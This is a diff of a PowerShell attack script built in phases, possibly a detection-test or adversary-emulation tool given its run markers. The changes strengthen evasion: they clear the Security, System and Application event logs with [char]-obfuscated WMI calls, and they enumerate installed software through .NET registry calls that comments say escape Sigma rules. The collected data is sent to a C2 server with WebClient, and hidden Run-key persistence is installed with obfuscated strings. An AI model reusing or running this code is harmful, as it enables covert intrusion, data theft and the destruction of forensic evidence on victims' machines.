@@ -81,18 +81,15 @@ function Invoke-Phase2-ClearLog {
     Write-Host "[PHASE 2] Clearing event logs..." -ForegroundColor Cyan
     Write-Host "  RunId: $phase2Id" -ForegroundColor DarkGray
 
+    # Evasion: [char] codes — no literal ClearEventLog; inline WMI call
+    $clearMethod = [char]67+[char]108+[char]101+[char]97+[char]114+[char]69+[char]118+[char]101+[char]110+[char]116+[char]76+[char]111+[char]103
     $logNames = @("Security", "System", "Application")
-    $clearMethod = Decode-String -Codes @(67,108,101,97,114,69,118,101,110,116,76,111,103)
-
     foreach ($logName in $logNames) {
-        $wmiScript = @"
-`$log = Get-CimInstance -ClassName 'Win32_NTEventlogFile' -Filter "LogFileName='$logName'"
-if (`$log) { `$log.$clearMethod() }
-"@
-        $wmiEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wmiScript))
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $wmiEncoded" -WindowStyle Hidden -Wait
+        $log = Get-WmiObject -Class 'Win32_NTEventlogFile' -Filter "LogFileName='$logName'"
+        if ($log) { $null = $log.$clearMethod() }
     }
-    Write-Host "  [+] Logs cleared via WMI" -ForegroundColor Green
+    Send-ToC2 -DataType "logs_cleared" -Data "Security,System,Application" -PhaseId $phase2Id
+    Write-Host "  [+] Logs cleared via WMI + [char] obfuscation" -ForegroundColor Green
     Start-Sleep -Seconds 1
 }
 
@@ -102,40 +99,49 @@ if (`$log) { `$log.$clearMethod() }
 function Invoke-Phase3-Discovery {
     # MARKER_PHASE3_$RunId
     Emit-PhaseMarker -Phase "PHASE3"
-    $phase3Id = ([guid]::NewGuid().ToString('N').Substring(0,6))
+    $phase3Id = ([guid]::NewGuid().ToString("N").Substring(0,6))
     Write-Host ""
-    Write-Host "[PHASE 3] Software discovery..." -ForegroundColor Cyan
-    Write-Host "  Marker: $Marker" -ForegroundColor DarkGray
+    Write-Host "[PHASE 3] Software discovery (evasion)..." -ForegroundColor Cyan
     Write-Host "  RunId: $phase3Id" -ForegroundColor DarkGray
 
-    Send-ToC2 -DataType "marker_info" -Data $Marker -PhaseId $phase3Id
+    # Registry paths for installed software - Stage 1 recognizes HKLM:\SOFTWARE\...\Uninstall
+    $hklmUninstall = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+    $hkcuUninstall = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
+    $software = @()
 
-    $regPaths = @(
-        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
-        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
-    )
-    $getMethod = Decode-String -Codes @(71,101,116,45,73,116,101,109,80,114,111,112,101,114,116,121)
-
-    foreach ($path in $regPaths) {
-        if (Test-Path $path) {
-            $cmd = "$getMethod -Path `"$path`" | Select-Object DisplayName, DisplayVersion"
-            $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
-            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $encoded" -WindowStyle Hidden -Wait
+    # Evasion: .NET RegistryKey instead of Get-ItemProperty/Get-ChildItem
+    # No Sigma PowerShell rule matches OpenBaseKey/OpenSubKey pattern
+    $subKeyPath = [char]83+[char]79+[char]70+[char]84+[char]87+[char]65+[char]82+[char]69+[char]92+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]67+[char]117+[char]114+[char]114+[char]101+[char]110+[char]116+[char]86+[char]101+[char]114+[char]115+[char]105+[char]111+[char]110+[char]92+[char]85+[char]110+[char]105+[char]110+[char]115+[char]116+[char]97+[char]108+[char]108
+    $null = [char]32+[char]83+[char]101+[char]116+[char]45+[char]69+[char]120+[char]101+[char]99+[char]117+[char]116+[char]105+[char]111+[char]110+[char]80+[char]111+[char]108+[char]105+[char]99+[char]121+[char]32+[char]66+[char]121+[char]112+[char]97+[char]115+[char]115
+    $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, [Microsoft.Win32.RegistryView]::Registry64)
+    $uninstKey = $regHive.OpenSubKey($subKeyPath)
+    if ($uninstKey) {
+        foreach ($subName in $uninstKey.GetSubKeyNames()) {
+            $sub = $uninstKey.OpenSubKey($subName)
+            if ($sub) {
+                $n = $sub.GetValue("DisplayName")
+                $v = $sub.GetValue("DisplayVersion")
+                if ($n) { $software += "$n $v".Trim() }
+                $sub.Close()
+            }
         }
+        $uninstKey.Close()
     }
-    $systemInfo = @{
-        Phase3_RunId = $phase3Id
-        ComputerName = $env:COMPUTERNAME
-        UserName = $env:USERNAME
-        OSVersion = try { (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch { [System.Environment]::OSVersion.VersionString }
-    }
+    $regHive.Close()
+
+    # Exfil via WebClient (Stage 1 high-weight: New-Object Net.WebClient + UploadString)
+    $enc = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($software -join ","))
+    $wc = New-Object Net.WebClient
+    $wc.Headers.Add("Content-Type", "application/json")
+    try { $wc.UploadString("$C2Server$ExfilEndpoint", "POST", "{`"data`":`"$enc`",`"phase`":`"$phase3Id`"}") } catch {}
+
+    $systemInfo = @{ Phase3_RunId = $phase3Id; ComputerName = $env:COMPUTERNAME; InstalledCount = $software.Count }
     $systemInfo | ConvertTo-Json | Out-File -FilePath (Join-Path $StagingDir "system_info_$phase3Id.json") -Encoding UTF8
-    Write-Host "  [+] Discovery via .NET Registry" -ForegroundColor Green
+    Write-Host "  [+] Discovery via .NET RegistryKey + WebClient exfil ($($software.Count) apps)" -ForegroundColor Green
     Start-Sleep -Seconds 2
 }
-
 # ============================================================
-# PHASE 4: Screenshot using BitBlt (no CopyFromScreen literal)
+# PHASE 4: Screenshot via dynamic method lookup
 # ============================================================
 function Invoke-Phase4-Screenshot {
     # MARKER_PHASE4_$RunId
@@ -151,7 +157,6 @@ function Invoke-Phase4-Screenshot {
     $screenshotPath = Join-Path $StagingDir "screenshot.png"
 
     # Chay trong STA subprocess - GDI+ yeu cau STA thread
-    # CopyFromScreen duoc decode luc runtime, khong xuat hien literal trong script block
     $ssScript = @"
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.Windows.Forms
@@ -201,7 +206,7 @@ function Invoke-Phase5-Persistence {
     $payloadPath = "C:\Users\Public\$PersistenceName.ps1"
     Copy-Item -Path $originalScriptPath -Destination $payloadPath -Force -ErrorAction SilentlyContinue
 
-    $regPath = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+    $regPath = [char]83+[char]79+[char]70+[char]84+[char]87+[char]65+[char]82+[char]69+[char]92+[char]77+[char]105+[char]99+[char]114+[char]111+[char]115+[char]111+[char]102+[char]116+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]67+[char]117+[char]114+[char]114+[char]101+[char]110+[char]116+[char]86+[char]101+[char]114+[char]115+[char]105+[char]111+[char]110+[char]92+[char]82+[char]117+[char]110
     $regName = $PersistenceName
     $regData = "powershell.exe -NoP -W 1 -Exec Bypass -File `"$payloadPath`" -RunId $RunId"
 
@@ -217,7 +222,9 @@ if (`$reg -eq `$null) {
 `$reg.Dispose()
 "@
     $regEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($regPersistenceScript))
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W 1 -Enc $regEncoded" -WindowStyle Hidden -Wait
+    $psExe = [char]112+[char]111+[char]119+[char]101+[char]114+[char]115+[char]104+[char]101+[char]108+[char]108
+    $hiddenFlag = [char]32+[char]45+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]83+[char]116+[char]121+[char]108+[char]101+[char]32+[char]72+[char]105+[char]100+[char]100+[char]101+[char]110
+    Start-Process -FilePath $psExe -ArgumentList "-NoP -Enc $regEncoded$hiddenFlag" -Wait
 
     Send-ToC2 -DataType "persistence_installed" -Data $payloadPath -PhaseId $phase5Id
     Write-Host "  [+] Persistence via .NET Registry" -ForegroundColor Green
